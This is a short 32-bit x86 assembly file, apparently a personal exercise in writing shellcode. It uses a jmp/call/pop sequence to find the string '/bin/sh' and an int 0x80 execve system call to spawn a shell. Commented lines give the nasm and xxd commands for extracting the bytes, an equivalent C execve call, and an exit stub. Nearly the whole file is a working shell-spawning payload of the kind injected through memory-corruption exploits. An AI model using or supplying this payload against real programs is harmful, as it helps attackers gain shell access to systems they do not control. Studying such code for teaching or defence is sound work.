BITS 32
xor edx, edx
push edx
jmp short arg0
fir:
pop ebx
push ebx
mov ecx, esp
xor eax, eax
mov al, 11
int 0x80
;arg1:
;call near arg0
;db "arg1"
;db 0
arg0:
call near fir
db "/bin/sh"
db 0


; nasm tes.s 
; xxd tes

; char s[] = "/bin/sh";
; char* ss[2] = {s,0};
;	execve(s,ss,0);

;BITS 32
;global _start
;_start:
;	mov eax,1
;	int 0x80

; nasm -f elf32 tes.s
; gcc -nostdlib -m32 tes.o


